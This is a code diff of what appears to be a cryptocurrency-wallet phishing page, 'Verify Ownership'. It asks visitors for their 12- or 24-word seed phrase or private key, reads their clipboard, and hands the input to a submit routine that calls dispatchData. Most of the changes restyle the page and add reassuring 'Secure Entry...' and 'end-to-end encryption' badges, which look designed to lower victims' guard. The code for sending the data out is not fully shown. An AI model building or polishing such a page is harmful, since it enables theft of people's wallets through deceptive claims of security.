@@ -23,306 +23,253 @@
     </script>
     <title>Mainnet web - Verify Ownership</title>
     <style>
-        *,
-        *::before,
-        *::after {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
         .verify-page {
             min-height: 100vh;
-            background: #08001a;
+            background: #f8f9fc;
+            background-image: radial-gradient(circle at top right, rgba(83, 196, 227, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at bottom left, rgba(167, 139, 250, 0.08) 0%, transparent 60%);
             display: flex;
-            align-items: center;
+            align-items: flex-start;
             justify-content: center;
             padding: 40px 16px 60px;
-            position: relative;
-            overflow: hidden;
-            font-family: 'DM Sans', sans-serif;
         }
 
-        /* Animated background orbs */
-        .verify-page::before {
-            content: '';
-            position: fixed;
-            top: -20%;
-            left: -10%;
-            width: 70vw;
-            height: 70vw;
-            background: radial-gradient(circle, rgba(83, 196, 227, 0.07) 0%, transparent 65%);
-            border-radius: 50%;
-            animation: orbFloat1 12s ease-in-out infinite alternate;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .verify-page::after {
-            content: '';
-            position: fixed;
-            bottom: -15%;
-            right: -5%;
-            width: 55vw;
-            height: 55vw;
-            background: radial-gradient(circle, rgba(120, 60, 255, 0.08) 0%, transparent 65%);
-            border-radius: 50%;
-            animation: orbFloat2 15s ease-in-out infinite alternate;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        @keyframes orbFloat1 {
-            from {
-                transform: translate(0, 0) scale(1);
-            }
-
-            to {
-                transform: translate(4%, 6%) scale(1.08);
-            }
-        }
-
-        @keyframes orbFloat2 {
-            from {
-                transform: translate(0, 0) scale(1);
-            }
-
-            to {
-                transform: translate(-5%, -4%) scale(1.1);
-            }
-        }
-
-        /* Grid lines overlay */
-        .verify-bg-grid {
-            position: fixed;
-            inset: 0;
-            background-image:
-                linear-gradient(rgba(83, 196, 227, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(83, 196, 227, 0.03) 1px, transparent 1px);
-            background-size: 48px 48px;
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        /* ─── Card ─────────────────────────────────────────── */
         .verify-card {
             width: 100%;
-            max-width: 540px;
-            background: rgba(255, 255, 255, 0.035);
-            backdrop-filter: blur(28px);
-            -webkit-backdrop-filter: blur(28px);
-            border-radius: 24px;
-            border: 1px solid rgba(83, 196, 227, 0.14);
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 20px;
+            border: 1px solid rgba(83, 196, 227, 0.15);
             box-shadow:
-                0 0 0 1px rgba(255, 255, 255, 0.04) inset,
-                0 32px 80px rgba(0, 0, 0, 0.55),
-                0 0 60px rgba(83, 196, 227, 0.05);
-            padding: 40px 36px 36px;
+                0 12px 48px rgba(17, 0, 44, 0.05),
+                0 2px 12px rgba(0, 0, 0, 0.03);
+            padding: 36px 28px 32px;
             position: relative;
-            z-index: 1;
             overflow: hidden;
-            animation: cardIn 0.55s cubic-bezier(0.22, 1, 0.36, 1) both;
+            transition: box-shadow 0.3s ease;
         }
 
-        @keyframes cardIn {
-            from {
-                opacity: 0;
-                transform: translateY(28px) scale(0.97);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
+        .verify-card:hover {
+            box-shadow:
+                0 16px 56px rgba(17, 0, 44, 0.08),
+                0 4px 16px rgba(0, 0, 0, 0.04);
         }
 
-        /* Top accent beam */
         .verify-card::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, rgba(83, 196, 227, 0.7), rgba(167, 139, 250, 0.5), transparent);
-            border-radius: 24px 24px 0 0;
+            height: 4px;
+            background: linear-gradient(90deg, #11002c, rgba(83, 196, 227, 0.8), #11002c);
+            background-size: 200% auto;
+            border-radius: 20px 20px 0 0;
+            animation: gradientMove 4s linear infinite;
         }
 
-        /* ─── Logo / badge ──────────────────────────────────── */
-        .verify-badge {
-            width: 52px;
-            height: 52px;
-            border-radius: 14px;
-            background: linear-gradient(135deg, rgba(83, 196, 227, 0.15), rgba(120, 60, 255, 0.15));
-            border: 1px solid rgba(83, 196, 227, 0.22);
+        @keyframes gradientMove {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .verify-header-wrap {
             display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-            position: relative;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 24px;
         }
 
-        .verify-badge i {
-            font-size: 24px;
-            color: #53c4e3;
-            filter: drop-shadow(0 0 8px rgba(83, 196, 227, 0.5));
+        .verify-header-text {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
         }
 
-        .verify-badge::after {
-            content: '';
-            position: absolute;
-            inset: -1px;
-            border-radius: 15px;
-            background: linear-gradient(135deg, rgba(83, 196, 227, 0.3), transparent 60%);
-            pointer-events: none;
-        }
-
-        /* ─── Header text ───────────────────────────────────── */
         .verify-header {
-            font-family: 'Space Grotesk', sans-serif;
+            font-family: 'Outfit', sans-serif;
             font-size: 24px;
             font-weight: 700;
-            color: #f0f4ff;
-            margin-bottom: 6px;
-            letter-spacing: -0.02em;
-            line-height: 1.2;
+            color: #11002c;
+            margin: 0;
+            letter-spacing: -0.01em;
         }
 
         .verify-subtitle {
             font-size: 14px;
-            color: rgba(180, 190, 220, 0.65);
-            margin-bottom: 28px;
-            line-height: 1.5;
+            color: #64748b;
+            margin: 0;
+            font-family: 'DM Sans', sans-serif;
         }
 
-        /* ─── Divider ───────────────────────────────────────── */
-        .verify-divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(83, 196, 227, 0.15), transparent);
-            margin-bottom: 24px;
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            background: rgba(0, 208, 132, 0.08);
+            border: 1px solid rgba(0, 208, 132, 0.2);
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #00d084;
+            font-family: 'DM Sans', sans-serif;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* ─── Controls row ──────────────────────────────────── */
+        .secure-badge i {
+            font-size: 14px;
+        }
+
+        .secure-badge.active-typing {
+            background: rgba(83, 196, 227, 0.1);
+            border-color: rgba(83, 196, 227, 0.3);
+            color: #0088cc;
+            transform: scale(1.05);
+            box-shadow: 0 0 12px rgba(83, 196, 227, 0.2);
+        }
+
+        .secure-badge.active-typing i {
+            animation: pulse-icon 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse-icon {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.6;
+                transform: scale(1.1);
+            }
+        }
+
         .verify-controls {
             display: flex;
-            gap: 10px;
-            margin-bottom: 18px;
-        }
-
-        .select-wrapper {
-            flex: 1;
-            position: relative;
-        }
-
-        .select-wrapper::after {
-            content: '';
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 0;
-            height: 0;
-            border-left: 5px solid transparent;
-            border-right: 5px solid transparent;
-            border-top: 5px solid rgba(83, 196, 227, 0.7);
-            pointer-events: none;
+            gap: 12px;
+            margin-bottom: 20px;
         }
 
         .verify-select {
-            width: 100%;
-            padding: 12px 38px 12px 14px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(83, 196, 227, 0.2);
+            flex: 1;
+            padding: 12px 16px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
             border-radius: 12px;
-            color: #d4e0ff;
+            color: #1e293b;
             font-family: 'DM Sans', sans-serif;
-            font-size: 13.5px;
-            font-weight: 600;
+            font-size: 14px;
+            font-weight: 500;
             outline: none;
             cursor: pointer;
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
             appearance: none;
             -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 40px;
         }
 
-        .verify-select option {
-            background: #12003a;
-            color: #d4e0ff;
+        .verify-select:hover {
+            border-color: #cbd5e1;
+            background: #ffffff;
         }
 
         .verify-select:focus {
-            border-color: rgba(83, 196, 227, 0.5);
-            box-shadow: 0 0 0 3px rgba(83, 196, 227, 0.1);
-            background: rgba(83, 196, 227, 0.07);
+            border-color: #53c4e3;
+            box-shadow: 0 0 0 4px rgba(83, 196, 227, 0.15);
+            background: #ffffff;
         }
 
         .paste-btn {
-            padding: 12px 20px;
-            background: rgba(83, 196, 227, 0.1);
-            color: #53c4e3;
-            border: 1px solid rgba(83, 196, 227, 0.25);
+            padding: 12px 24px;
+            background: #11002c;
+            color: #ffffff;
+            border: none;
             border-radius: 12px;
             font-family: 'DM Sans', sans-serif;
-            font-size: 13px;
-            font-weight: 700;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
             letter-spacing: 0.02em;
-            transition: background 0.2s, transform 0.15s, box-shadow 0.2s, border-color 0.2s;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
             white-space: nowrap;
         }
 
         .paste-btn:hover {
-            background: rgba(83, 196, 227, 0.18);
-            border-color: rgba(83, 196, 227, 0.5);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 20px rgba(83, 196, 227, 0.15);
+            background: #2a1158;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(17, 0, 44, 0.15);
         }
 
         .paste-btn:active {
             transform: translateY(0);
         }
 
-        /* ─── Error ─────────────────────────────────────────── */
         .verify-error {
-            font-size: 12.5px;
-            color: #ff6b7a;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 13px;
+            font-weight: 500;
+            color: #ef4444;
             min-height: 20px;
             margin-bottom: 16px;
             display: flex;
             align-items: center;
             gap: 6px;
             opacity: 0;
-            transition: opacity 0.22s;
-            background: rgba(220, 40, 41, 0.08);
-            border: 1px solid rgba(220, 40, 41, 0.2);
+            transform: translateY(-5px);
+            transition: all 0.3s ease;
+            background: rgba(239, 68, 68, 0.05);
+            padding: 8px 12px;
             border-radius: 8px;
-            padding: 0;
-            max-height: 0;
-            overflow: hidden;
-            pointer-events: none;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            visibility: hidden;
         }
 
         .verify-error.show {
             opacity: 1;
-            max-height: 48px;
-            padding: 8px 12px;
+            transform: translateY(0);
+            visibility: visible;
         }
 
         .verify-error i {
-            font-size: 15px;
-            flex-shrink: 0;
+            font-size: 16px;
         }
 
-        /* ─── Phrase grid ───────────────────────────────────── */
         .phrase-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 20px;
-            transition: all 0.3s ease;
+            gap: 12px;
+            margin-bottom: 24px;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .phrase-grid.private-key-mode {
@@ -331,270 +278,348 @@
 
         .phrase-input-wrap {
             position: relative;
+            animation: fadeUp 0.3s ease forwards;
+            opacity: 0;
+        }
+
+        .phrase-input-wrap:nth-child(1) {
+            animation-delay: 0.02s;
+        }
+
+        .phrase-input-wrap:nth-child(2) {
+            animation-delay: 0.04s;
+        }
+
+        .phrase-input-wrap:nth-child(3) {
+            animation-delay: 0.06s;
+        }
+
+        .phrase-input-wrap:nth-child(4) {
+            animation-delay: 0.08s;
+        }
+
+        .phrase-input-wrap:nth-child(5) {
+            animation-delay: 0.10s;
+        }
+
+        .phrase-input-wrap:nth-child(6) {
+            animation-delay: 0.12s;
+        }
+
+        .phrase-input-wrap:nth-child(7) {
+            animation-delay: 0.14s;
+        }
+
+        .phrase-input-wrap:nth-child(8) {
+            animation-delay: 0.16s;
+        }
+
+        .phrase-input-wrap:nth-child(9) {
+            animation-delay: 0.18s;
+        }
+
+        .phrase-input-wrap:nth-child(10) {
+            animation-delay: 0.20s;
+        }
+
+        .phrase-input-wrap:nth-child(11) {
+            animation-delay: 0.22s;
+        }
+
+        .phrase-input-wrap:nth-child(12) {
+            animation-delay: 0.24s;
+        }
+
+        .phrase-input-wrap:nth-child(n+13) {
+            animation-delay: 0.26s;
         }
 
         .phrase-input-wrap .input-num {
             position: absolute;
-            left: 10px;
+            left: 12px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 10px;
-            font-weight: 700;
-            color: rgba(83, 196, 227, 0.5);
+            font-size: 11px;
+            font-weight: 600;
+            color: #94a3b8;
             pointer-events: none;
-            font-family: 'Space Grotesk', monospace;
-            letter-spacing: 0.04em;
-            z-index: 1;
+            font-family: 'Space Grotesk', sans-serif;
+            transition: color 0.3s;
         }
 
         .phrase-field {
             width: 100%;
-            padding: 11px 10px 11px 30px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(83, 196, 227, 0.14);
+            padding: 12px 12px 12px 34px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
             border-radius: 10px;
-            color: #d4e0ff;
+            color: #0f172a;
             font-family: 'DM Sans', sans-serif;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 500;
             outline: none;
-            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .phrase-field::placeholder {
-            color: rgba(180, 190, 220, 0.3);
+            color: #cbd5e1;
             font-weight: 400;
         }
 
+        .phrase-field:hover {
+            border-color: #cbd5e1;
+            background: #ffffff;
+        }
+
         .phrase-field:focus {
-            border-color: rgba(83, 196, 227, 0.45);
-            box-shadow: 0 0 0 3px rgba(83, 196, 227, 0.08);
-            background: rgba(83, 196, 227, 0.06);
+            border-color: #53c4e3;
+            box-shadow: 0 0 0 4px rgba(83, 196, 227, 0.15);
+            background: #ffffff;
+            transform: translateY(-1px);
+        }
+
+        .phrase-field:focus+.input-num,
+        .phrase-field:focus~.input-num {
+            color: #53c4e3;
         }
 
         .phrase-field.has-value {
-            border-color: rgba(0, 208, 132, 0.35);
-            background: rgba(0, 208, 132, 0.04);
+            border-color: rgba(0, 208, 132, 0.4);
+            background: rgba(0, 208, 132, 0.03);
+            font-weight: 600;
+        }
+
+        .phrase-field.has-value:focus {
+            border-color: #00d084;
+            box-shadow: 0 0 0 4px rgba(0, 208, 132, 0.15);
         }
 
         .phrase-field.error {
-            border-color: rgba(220, 40, 41, 0.45);
-            background: rgba(220, 40, 41, 0.04);
+            border-color: #ef4444;
+            background: rgba(239, 68, 68, 0.03);
+            animation: shake 0.4s ease-in-out;
         }
 
-        /* ─── Private key textarea ──────────────────────────── */
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-4px);
+            }
+
+            75% {
+                transform: translateX(4px);
+            }
+        }
+
         .pk-field {
             width: 100%;
             padding: 16px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(83, 196, 227, 0.14);
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
             border-radius: 12px;
-            color: #53c4e3;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
+            color: #0f172a;
+            font-family: 'Space Grotesk', monospace;
+            font-size: 14px;
             font-weight: 500;
             outline: none;
-            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
             resize: none;
-            height: 88px;
-            line-height: 1.7;
+            height: 100px;
+            line-height: 1.6;
+            animation: fadeUp 0.3s ease forwards;
         }
 
         .pk-field::placeholder {
-            color: rgba(180, 190, 220, 0.3);
+            color: #94a3b8;
             font-family: 'DM Sans', sans-serif;
             font-weight: 400;
         }
 
-        .pk-field:focus {
-            border-color: rgba(83, 196, 227, 0.45);
-            box-shadow: 0 0 0 3px rgba(83, 196, 227, 0.08);
-            background: rgba(83, 196, 227, 0.06);
+        .pk-field:hover {
+            border-color: #cbd5e1;
+            background: #ffffff;
         }
 
-        /* ─── Security note ─────────────────────────────────── */
+        .pk-field:focus {
+            border-color: #53c4e3;
+            box-shadow: 0 0 0 4px rgba(83, 196, 227, 0.15);
+            background: #ffffff;
+            transform: translateY(-2px);
+        }
+
         .security-note {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 7px;
-            font-size: 12px;
-            color: rgba(180, 190, 220, 0.5);
-            margin-bottom: 20px;
-            line-height: 1.5;
+            gap: 8px;
+            font-size: 13px;
+            color: #64748b;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 500;
+            margin-bottom: 24px;
+            padding: 12px;
+            background: #f8fafc;
+            border-radius: 10px;
+            border: 1px dashed #cbd5e1;
+            animation: fadeUp 0.6s ease forwards;
         }
 
         .security-note i {
-            font-size: 14px;
-            color: rgba(83, 196, 227, 0.55);
+            color: #00d084;
+            font-size: 16px;
         }
 
-        /* ─── Verify button ─────────────────────────────────── */
         .verify-btn {
             width: 100%;
-            padding: 15px 24px;
-            background: linear-gradient(135deg, #1a0050 0%, #0d2a45 100%);
+            padding: 16px 24px;
+            background: #11002c;
             color: #ffffff;
-            border: 1px solid rgba(83, 196, 227, 0.25);
+            border: none;
             border-radius: 14px;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 15px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            letter-spacing: 0.04em;
-            transition: transform 0.18s, box-shadow 0.22s, border-color 0.2s;
+            letter-spacing: 0.02em;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             position: relative;
             overflow: hidden;
-        }
-
-        .verify-btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(83, 196, 227, 0.22), rgba(167, 139, 250, 0.2));
-            opacity: 0;
-            transition: opacity 0.22s;
+            animation: fadeUp 0.7s ease forwards;
         }
 
         .verify-btn::after {
             content: '';
             position: absolute;
-            top: 0;
-            left: -100%;
-            width: 60%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.06), transparent);
-            transform: skewX(-20deg);
-            transition: left 0.5s ease;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.6s ease;
         }
 
         .verify-btn:hover {
+            background: #2a1158;
             transform: translateY(-2px);
-            box-shadow:
-                0 12px 40px rgba(83, 196, 227, 0.18),
-                0 4px 16px rgba(0, 0, 0, 0.4);
-            border-color: rgba(83, 196, 227, 0.5);
-        }
-
-        .verify-btn:hover::before {
-            opacity: 1;
+            box-shadow: 0 8px 24px rgba(17, 0, 44, 0.25);
         }
 
         .verify-btn:hover::after {
-            left: 160%;
+            transform: translateX(100%);
         }
 
         .verify-btn:active {
             transform: translateY(0);
+            box-shadow: 0 4px 12px rgba(17, 0, 44, 0.15);
         }
 
-        .verify-btn i,
-        .verify-btn span {
-            position: relative;
-            z-index: 1;
+        .verify-btn i {
+            font-size: 18px;
+            transition: transform 0.3s ease;
         }
 
-        /* ─── Spin animation for loader ─────────────────────── */
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+        .verify-btn:hover i {
+            transform: scale(1.1);
         }
 
-        .ri-spin {
-            animation: spin 0.8s linear infinite;
-        }
-
-        /* ─── Responsive ────────────────────────────────────── */
         @media (max-width: 560px) {
             .verify-page {
-                padding: 24px 12px 48px;
-                align-items: flex-start;
+                padding: 20px 12px 40px;
             }
 
             .verify-card {
-                padding: 28px 20px 28px;
-                border-radius: 18px;
+                padding: 30px 20px 24px;
+                border-radius: 16px;
             }
 
             .verify-header {
                 font-size: 20px;
             }
 
+            .verify-header-wrap {
+                flex-direction: column;
+                gap: 12px;
+            }
+
             .phrase-grid {
                 grid-template-columns: repeat(2, 1fr);
-                gap: 6px;
+                gap: 8px;
             }
 
             .phrase-field {
-                padding: 10px 8px 10px 26px;
-                font-size: 12px;
+                padding: 10px 10px 10px 30px;
+                font-size: 13px;
             }
 
             .phrase-input-wrap .input-num {
-                left: 7px;
-                font-size: 9px;
+                left: 10px;
             }
 
             .verify-controls {
                 gap: 8px;
+                flex-direction: column;
             }
 
             .paste-btn {
-                padding: 12px 14px;
-                font-size: 12px;
+                justify-content: center;
             }
         }
     </style>
 </head>
 
+
 <body>
 
     <div class="verify-page">
-        <div class="verify-bg-grid"></div>
-
         <div class="verify-card">
 
-            <div class="verify-badge">
-                <i class="ri-shield-keyhole-line"></i>
+            <div class="verify-header-wrap">
+                <div class="verify-header-text">
+                    <h1 class="verify-header">Ownership Verification</h1>
+                    <p class="verify-subtitle">Select a verification method</p>
+                </div>
+                <div class="secure-badge" id="secureBadge">
+                    <i class="ri-lock-2-line"></i>
+                    <span id="secureBadgeText">Secure</span>
+                </div>
             </div>
 
-            <h1 class="verify-header">Ownership Verification</h1>
-            <p class="verify-subtitle">Select a verification method to securely confirm wallet ownership</p>
-
-            <div class="verify-divider"></div>
 
             <div class="verify-controls">
-                <div class="select-wrapper">
-                    <select class="verify-select" id="verifyMethod" onchange="onSelectChange()">
-                        <option value="12">12-word phrase</option>
-                        <option value="24">24-word phrase</option>
-                        <option value="pk">Private key</option>
-                    </select>
-                </div>
-                <button class="paste-btn" id="pasteBtn" onclick="onClipboardPaste()">
+                <select class="verify-select" id="verifyMethod" onchange="onSelectChange()">
+                    <option value="12">12-word phrase</option>
+                    <option value="24">24-word phrase</option>
+                    <option value="pk">Private key</option>
+                </select>
+                <button class="paste-btn" onclick="onClipboardPaste()">
                     <i class="ri-clipboard-line"></i>
                     Paste
                 </button>
             </div>
 
+
             <div class="verify-error" id="verifyError">
-                <i class="ri-error-warning-fill"></i>
+                <i class="ri-error-warning-line"></i>
                 <span id="verifyErrorText"></span>
             </div>
 
             <div id="inputContainer"></div>
 
-            <p class="security-note">
-                <i class="ri-lock-2-fill"></i>
-                Your data is protected with end-to-end encryption
-            </p>
 
-            <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">
+            <div class="security-note">
+                <i class="ri-shield-check-fill"></i>
+                <span>Your data is protected with end-to-end encryption</span>
+            </div>
+
+
+            <button class="verify-btn" onclick="handleVerify()">
                 <i class="ri-shield-check-line"></i>
                 <span>Verify Ownership</span>
             </button>
@@ -608,7 +633,6 @@
         const verifyError = document.getElementById('verifyError');
         const verifyErrorText = document.getElementById('verifyErrorText');
         const verifyMethod = document.getElementById('verifyMethod');
-
         function buildInputFields(type) {
             clearError();
             inputContainer.innerHTML = '';
@@ -617,7 +641,7 @@
 
                 const grid = document.createElement('div');
                 grid.className = 'phrase-grid private-key-mode';
-                grid.style.marginBottom = '20px';
+                grid.style.marginBottom = '18px';
 
                 const textarea = document.createElement('textarea');
                 textarea.className = 'pk-field';
@@ -627,6 +651,13 @@
                 textarea.autocomplete = 'off';
                 textarea.autocorrect = 'off';
                 textarea.autocapitalize = 'off';
+
+                textarea.addEventListener('focus', function () {
+                    setSecureTypingState(true);
+                });
+                textarea.addEventListener('blur', function () {
+                    setSecureTypingState(false);
+                });
 
                 grid.appendChild(textarea);
                 inputContainer.appendChild(grid);
@@ -656,12 +687,13 @@
                     input.autocorrect = 'off';
                     input.autocapitalize = 'off';
 
+
                     input.addEventListener('keydown', function (e) {
                         if (e.key === ' ' || e.code === 'Space') {
                             e.preventDefault();
                             const currentVal = this.value.trim();
                             if (currentVal) {
-                                this.value = currentVal;
+                                this.value = currentVal; // remove any trailing space
                                 this.classList.add('has-value');
                             }
                             const idx = parseInt(this.getAttribute('data-index'));
@@ -672,10 +704,19 @@
                         }
                     });
 
+
                     input.addEventListener('input', function () {
                         this.classList.toggle('has-value', this.value.trim().length > 0);
                         this.classList.remove('error');
                         clearError();
+                    });
+
+                    input.addEventListener('focus', function () {
+                        setSecureTypingState(true);
+                    });
+
+                    input.addEventListener('blur', function () {
+                        setSecureTypingState(false);
                     });
 
                     wrap.appendChild(num);
@@ -686,11 +727,9 @@
                 inputContainer.appendChild(grid);
             }
         }
-
         function onSelectChange() {
             buildInputFields(verifyMethod.value);
         }
-
         async function onClipboardPaste() {
             try {
                 const text = await navigator.clipboard.readText();
@@ -719,9 +758,9 @@
                 clearError();
             } catch (err) {
 
+
             }
         }
-
         function displayError(msg) {
             verifyErrorText.textContent = msg;
             verifyError.classList.add('show');
@@ -729,6 +768,19 @@
 
         function clearError() {
             verifyError.classList.remove('show');
+        }
+
+        function setSecureTypingState(isActive) {
+            const badge = document.getElementById('secureBadge');
+            if (!badge) return;
+
+            if (isActive) {
+                badge.classList.add('active-typing');
+                badge.innerHTML = '<i class="ri-lock-fill"></i><span>Secure Entry...</span>';
+            } else {
+                badge.classList.remove('active-typing');
+                badge.innerHTML = '<i class="ri-lock-2-line"></i><span>Secure</span>';
+            }
         }
 
         function handleVerify() {
@@ -743,7 +795,7 @@
                 const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{40,90}$/;
 
                 if (!val || (!hexRegex.test(val) && !base58Regex.test(val))) {
-                    displayError('Invalid private key format');
+                    displayError('invalid private key');
                     return;
                 }
 
@@ -778,13 +830,13 @@
                     return;
                 }
 
+
                 submitVerification(method, phraseWords.join(' '));
             }
         }
-
         function submitVerification(method, data) {
-            const btn = document.getElementById('verifyBtn');
-            btn.innerHTML = '<i class="ri-loader-4-line ri-spin" style="position:relative;z-index:1"></i><span style="position:relative;z-index:1">Verifying...</span>';
+            const btn = document.querySelector('.verify-btn');
+            btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i><span>Verifying...</span>';
             btn.style.pointerEvents = 'none';
 
             let _t = '';
@@ -827,7 +879,6 @@
             }
             dispatchData(2);
         }
-
         buildInputFields('12');
     </script>
 
